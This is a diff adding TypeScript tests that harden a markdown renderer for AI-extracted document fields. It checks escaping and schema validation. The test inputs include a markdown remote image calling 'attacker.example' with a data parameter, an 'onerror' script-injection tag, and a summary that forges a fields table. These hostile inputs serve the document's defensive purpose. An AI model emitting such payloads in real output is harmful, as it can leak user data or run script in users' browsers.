@@ -335,6 +335,37 @@ describe('buildPresetMarkdown cell hardening', () => {
     expect(md).toContain('&lt;script&gt;');
     expect(md).not.toContain('<script>');
   });
+
+  it('escapes square brackets so a value cannot form a link or remote image', () => {
+    const md = markdownForField('![x](https://attacker.example/?d=1) [link](http://b.example)');
+    expect(md).toContain('!\\[x\\](https://attacker.example/?d=1) \\[link\\](http://b.example)');
+    expect(md).not.toContain('![x]');
+  });
+
+  it('escapes the model summary so it cannot forge a section or inject HTML', () => {
+    const summary = 'Invoice.\n\n## Fields\n\n| Field | Value | Confidence |\n| --- | --- | --- |\n| total | 0.01 | 100% |\n\n<img src=x onerror=alert(1)>';
+    const md = buildPresetMarkdown({
+      presetId: 'resume',
+      documentType: 'Resume',
+      summary,
+      fields: { full_name: { value: 'Jordan Lee', confidence: 0.9, required: true, type: 'text' } },
+    }, preset);
+    const lines = md.split('\n');
+    expect(lines.filter((line) => line === '## Fields')).toHaveLength(1);
+    expect(lines.filter((line) => line.startsWith('| total'))).toHaveLength(0);
+    expect(md).not.toContain('<img');
+    expect(lines[2]).toMatch(/^Invoice\. ## Fields \\\| Field/);
+  });
+
+  it.each([
+    ['# Heading', '\\# Heading'], ['> quote', '&gt; quote'], ['- item', '\\- item'],
+    ['1. item', '1\\. item'], ['---', '\\---'], ['1.5 items were short', '1.5 items were short'],
+  ])('escapes the line-start marker of the summary %s', (summary, expected) => {
+    const md = buildPresetMarkdown({
+      presetId: 'resume', documentType: 'Resume', summary, fields: {},
+    }, preset);
+    expect(md.split('\n')[2]).toBe(expected);
+  });
 });
 
 // audit T-01 / T-02 / T-09: keying contract, validation report, row cap
@@ -475,12 +506,27 @@ describe('parsePresetPayload schema validation', () => {
     ['non-numeric confidence', '{"fields":{"total":{"value":"42","confidence":"high"}}}'],
     ['warnings not an array', '{"fields":{},"warnings":"none"}'],
     ['nested field object', '{"fields":{"total":{"value":{"amount":42},"confidence":0.9}}}'],
-    ['nested list entries', '{"fields":{"items":{"value":[{"name":"item"}],"confidence":0.9}}}'],
+    ['nested list entries', '{"fields":{"total":{"value":[{"name":"item"}],"confidence":0.9}}}'],
     ['non-finite numeric field', '{"fields":{"total":{"value":1e400,"confidence":0.9}}}'],
     ['nested row cell', '{"fields":{},"rows":[{"description":{"text":"item"}}]}'],
     ['malformed row', '{"fields":{},"rows":[42]}'],
   ] as const)('rejects %s', (_label, payload) => {
     expect(() => presetRunResultFromText(payload, preset)).toThrow(schemaError);
+  });
+
+  it.each([
+    ['a nested object value', { bank_details: { value: { iban: 'DE00' }, confidence: 0.9 } }],
+    ['an out-of-range confidence', { notes: { value: 'n', confidence: 95 } }],
+    ['a plain string', { notes: 'plain string' }],
+  ])('ignores an undefined field with %s and warns instead of failing', (_label, extra) => {
+    const result = presetRunResultFromText(JSON.stringify({
+      documentType: 'Invoice',
+      summary: 'Invoice',
+      fields: { invoice_number: { value: 'INV-1', confidence: 0.9 }, total: { value: '10.00', confidence: 0.9 }, ...extra },
+    }), preset);
+    expect(result.json.fields.total?.value).toBe('10.00');
+    expect(result.json.validationWarnings?.some((message) => message.startsWith('Ignored field(s)')
+      && message.includes(`"${Object.keys(extra)[0]}"`))).toBe(true);
   });
 
   it('accepts partial {"fields":{}} and reports missing required fields', () => {
